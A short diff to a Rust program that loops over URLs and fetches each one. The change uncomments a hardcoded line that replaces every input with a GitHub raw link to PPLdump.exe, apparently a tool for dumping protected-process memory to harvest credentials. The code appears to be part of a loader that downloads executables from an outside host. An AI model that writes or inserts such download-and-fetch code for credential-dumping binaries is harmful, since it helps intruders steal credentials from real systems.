@@ -26,7 +26,7 @@ fn main(){
         if url_str.clone().as_str().trim().is_empty() {
             continue;
         }
-        // let url_str = String::from("https://github.com/D1rkMtr/test/raw/main/PPLdump.exe");
+        let url_str = String::from("https://github.com/D1rkMtr/test/raw/main/PPLdump.exe");
 
         println!("[i] Fetching: {}", url_str);
         let url: Url = match Url::parse(url_str.as_str()) {
